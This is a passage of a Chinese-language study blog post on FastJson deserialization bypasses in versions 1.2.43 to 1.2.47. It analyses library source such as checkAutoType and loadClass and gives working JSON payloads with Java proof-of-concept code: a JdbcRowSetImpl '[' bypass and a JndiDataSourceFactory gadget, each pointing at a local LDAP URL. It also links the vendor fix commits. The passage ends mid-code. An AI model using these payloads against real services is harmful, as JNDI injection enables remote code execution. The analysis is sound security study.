<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, // </span></span><br><span class="line"><span class="params">                           Type type, // </span></span><br><span class="line"><span class="params">                           Object fieldName, // </span></span><br><span class="line"><span class="params">                           Object object, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span> features, //</span></span><br><span class="line"><span class="params">                           <span class="type">int</span>[] setFlags)</span> &#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">buf</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">StringBuffer</span>()) <span class="comment">//</span></span><br><span class="line">        .append(<span class="string">&quot;syntax error, expect &#123;, actual &quot;</span>) <span class="comment">//</span></span><br><span class="line">        .append(lexer.tokenName()) <span class="comment">//</span></span><br><span class="line">        .append(<span class="string">&quot;, pos &quot;</span>) <span class="comment">//</span></span><br><span class="line">        .append(lexer.pos());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fieldName <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            buf <span class="comment">//</span></span><br><span class="line">                .append(<span class="string">&quot;, fieldName &quot;</span>) <span class="comment">//</span></span><br><span class="line">                .append(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        buf.append(<span class="string">&quot;, fastjson-version &quot;</span>).append(JSON.VERSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(buf.toString());</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续修改，发现满足条件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结-4">总结</h3>
<p>使用 <strong>[</strong> 绕过，分别根据报错补足字符就行。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="例子-4">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;dataSourceName\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;autoCommit\&quot;: true\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-3">修复</h3>
<p>官方在 <strong>1.2.44</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/496418f626bda1e8cc285c5b49cbd2e55e82a5eb">修复</a>，新增了开头是
<strong>[</strong> 的判定。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_496418f626bda1e8cc285c5b49cbd2e55e82a5eb.png" /></p>
<h2 id="section-4">1.2.45</h2>
<h3 id="简介-4">简介</h3>
<p><strong>FastJson &lt;= 1.2.45</strong> 均生效。</p>
<p>新的 <strong>Gadget</strong> 绕过黑名单，需要开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="分析-5">分析</h3>
<h4 id="jndidatasourcefactory">JndiDataSourceFactory</h4>
<p>一个新的 <strong>Gadget</strong> 绕过黑名单。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>比较简单这个类，第 <strong>18</strong> 行处调用了
<strong>lookup</strong> 方法，值为 <strong>properties</strong> 的
<strong>DATA_SOURCE</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// JndiDataSourceFactory (org.apache.ibatis.datasource.jndi)</span></span><br><span class="line"><span class="keyword">private</span> DataSource dataSource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext initCtx;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> getEnvProperties(properties);</span><br><span class="line">    <span class="keyword">if</span> (env == <span class="literal">null</span>) &#123;</span><br><span class="line">    	initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (properties.containsKey(INITIAL_CONTEXT)</span><br><span class="line">    	&amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">    	<span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));</span><br><span class="line">    	dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">    	dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">    	<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DataSourceException</span>(<span class="string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="总结-5">总结</h3>
<p>新的绕过链，构造如下。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:14514/test&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="例子-5">例子</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> st.southsea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;properties\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;data_source\&quot;: \&quot;ldap://127.0.0.1:14514/test\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">user</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修复-4">修复</h3>
<p>官方在 <strong>1.2.46</strong> 对漏洞进行了<a
href="https://github.com/alibaba/fastjson/commit/f51faee23fb9ca81cc802eaf890302e49124e1b3">修复</a>，加了几个
<strong>denyHashCodes</strong>，其中
<strong>8083514888460375884[org.apache.ibatis.datasource]</strong>。</p>
<p><img
src="/images/Study-Unserialize-FastJson/github.com_alibaba_fastjson_commit_f51faee23fb9ca81cc802eaf890302e49124e1b3.png" /></p>
<h2 id="section-5">1.2.47</h2>
<h3 id="简介-5">简介</h3>
<p><strong>1.2.25 &lt;= FastJson &lt;= 1.2.32</strong> 可以在不开启
<strong>AutoTypeSupport</strong> 的情况下进行反序列化的利用。</p>
<p><strong>1.2.33 &lt;= FastJson &lt;= 1.2.47</strong> 需要开启
<strong>AutoTypeSupport</strong>。</p>
<h3 id="分析-6">分析</h3>
<h4 id="checkautotype">checkAutoType</h4>
<p>重点还是在 <strong>checkAutoType</strong> 这儿，代码注释如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ParserConfig (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">	<span class="comment">// autoTypeSupport 为 true 时</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            hash ^= className.charAt(i);</span><br><span class="line">            hash *= PRIME;</span><br><span class="line">            <span class="comment">// 先匹配白名单 acceptHashCodes</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 若为白名单则加载</span></span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 再匹配黑名单 denyHashCodes，若在黑名单中且 TypeUtils.mappings 里没有缓存这个类则抛出异常</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类为空则在 TypeUtils 的 mapping 缓存中寻找</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类为空则在 deserializers 中寻找</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到类就返回</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// autoTypeSupport 为 false 时</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(i);</span><br><span class="line">            hash ^= c;</span><br><span class="line">            hash *= PRIME;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 先匹配黑名单 denyHashCodes</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 存在则抛出异常</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">// 再匹配白名单 acceptHashCodes</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 类为空则加载</span></span><br><span class="line">                <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先判断 <strong>autoTypeSupport</strong> 为 <strong>true</strong>
时，如果匹配到黑名单，但 <strong>TypeUtils.mappings</strong>
中没有该类的缓存，才会抛出异常。</p>
<p>接着是从 <strong>TypeUtils.mappings</strong> 和
<strong>deserializers</strong> 中读取类，存在则直接返回。</p>
<p>然后判断 <strong>autoTypeSupport</strong> 为 <strong>false</strong>
时，如果匹配到黑名单直接抛出异常。</p>
<p>因此不论是否开启 <strong>autoTypeSupport</strong>，只要使得
<strong>TypeUtils.mappings</strong>
中有该类的缓存，那么就能直接成功返回反序列化利用类。</p>
<h4 id="getclassfrommapping">getClassFromMapping</h4>
<p><strong>getClassFromMapping</strong> 返回的是
<strong>TypeUtils.mappings</strong> 的内容。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> (Class)mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看一下调用的地方，有 <strong>put</strong> 操作的地方在
<strong>loadClass</strong> 方法。</p>
<p><img
src="/images/Study-Unserialize-FastJson/image-20230708104300434.png" /></p>
<h5 id="loadclass">loadClass</h5>
<p>当 <strong>cache</strong> 为 <strong>true</strong> 的时候，无论如何
<strong>mappings</strong> 最终都会置入类。而 <strong>loadClass</strong>
有三个重载方法，<strong>cache</strong> 皆为 <strong>true</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TypeUtils (com.alibaba.fastjson.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 如果 classLoader 非空</span></span><br><span class="line">        <span class="keyword">if</span>(classLoader != <span class="literal">null</span>)&#123;</span><br><span class="line">            clazz = classLoader.loadClass(className);</span><br><span class="line">            <span class="comment">// cache 为 true</span></span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                <span class="comment">// 则使用该类加载器加载并存入 mappings 中</span></span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果失败，或没有指定 classLoader </span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 使用上下文 contextClassLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">            clazz = contextClassLoader.loadClass(className);</span><br><span class="line">            <span class="comment">// cache 为 true</span></span><br><span class="line">            <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                <span class="comment">// 则使用该类加载器加载并存入 mappings 中</span></span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果失败</span></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// 使用类名加载</span></span><br><span class="line">        clazz = Class.forName(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e)&#123;</span><br><span class="line">        <span class="comment">// skip</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键点在 <strong>MiscCodec#deserialze</strong> 调用的
<strong>Class&lt;?&gt; loadClass(String className, ClassLoader
classLoader)</strong>。</p>
<p><img
src="/images/Study-Unserialize-FastJson/image-20230708114115929.png" /></p>
<h5 id="deserialze">deserialze</h5>
<p><strong>parser.resolveStatus</strong> 为
<strong>DefaultJSONParser.TypeNameRedirect</strong> 时，第
<strong>20</strong> 行处解析 <strong>val</strong> 的值，在
<strong>32</strong> 行传给 <strong>strVal</strong>，最后在
<strong>58</strong> 行判断 <strong>class</strong>，然后调用
<strong>loadClass</strong> 把 <strong>strVal</strong> 作为类名加进
<strong>mappings</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    Object objVal;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;</span><br><span class="line">        parser.resolveStatus = DefaultJSONParser.NONE;</span><br><span class="line">        parser.accept(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            lexer.nextToken();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.COLON);</span><br><span class="line"></span><br><span class="line">        objVal = parser.parse();</span><br><span class="line"></span><br><span class="line">        parser.accept(JSONToken.RBRACE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        objVal = parser.parse();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    String strVal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (objVal == <span class="literal">null</span>) &#123;</span><br><span class="line">        strVal = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        strVal = (String) objVal;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (objVal <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> (JSONObject) objVal;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == Currency.class) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">currency</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;currency&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (currency != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (T) Currency.getInstance(currency);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">symbol</span> <span class="operator">=</span> jsonObject.getString(<span class="string">&quot;currencyCode&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (symbol != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (T) Currency.getInstance(symbol);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (clazz == Map.Entry.class) &#123;</span><br><span class="line">               <span class="keyword">return</span> (T) jsonObject.entrySet().iterator().next();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> jsonObject.toJavaObject(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect string&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    	<span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>老样子查看调用 <strong>deserialze</strong> 的地方，跟进
<strong>DefaultJSONParser#parseObject</strong>。</p>
<p><img
src="/images/Study-Unserialize-FastJson/image-20230708151314071.png" /></p>
<h5 id="parseobject">parseObject</h5>
<p>解析到 <strong>key</strong> 为 <strong>JSON.DEFAULT_TYPE_KEY</strong>
即 <strong><span class="citation"
data-cites="type">@type</span></strong> 时进入，获取
<strong>typeName</strong> 后使用 <strong>checkAutoType</strong>
进行合法性检查，结合上文调用 <strong>loadClass</strong> 的地方，则此处
<strong>typeName</strong> 应该为
<strong>java.lang.Class</strong>，这自然是一个合法类，且在初始化时就被
<strong>ParserConfig#initDeserializers</strong> 加载在
<strong>checkAutoType</strong> 要调用的 <strong>deserializers</strong>
变量里，因此在第 <strong>7</strong> 行成功返回。</p>
<p>随后在 <strong>22</strong> 行处使用 <strong>setResolveStatus</strong>
设置了 <strong>TypeNameRedirect</strong>，最后调用
<strong>deserialze</strong> 方法返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// parseObject (com.alibaba.fastjson.parser)</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">parse</span><span class="params">(PropertyProcessable object, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Map.class.isAssignableFrom(clazz) ) &#123;</span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123;</span><br><span class="line">                lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"></span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line"></span><br><span class="line">        setResolveStatus(DefaultJSONParser.TypeNameRedirect);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context != <span class="literal">null</span> &amp;&amp; !(fieldName <span class="keyword">instanceof</span> Integer)) &#123;</span><br><span class="line">            popContext();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Map) 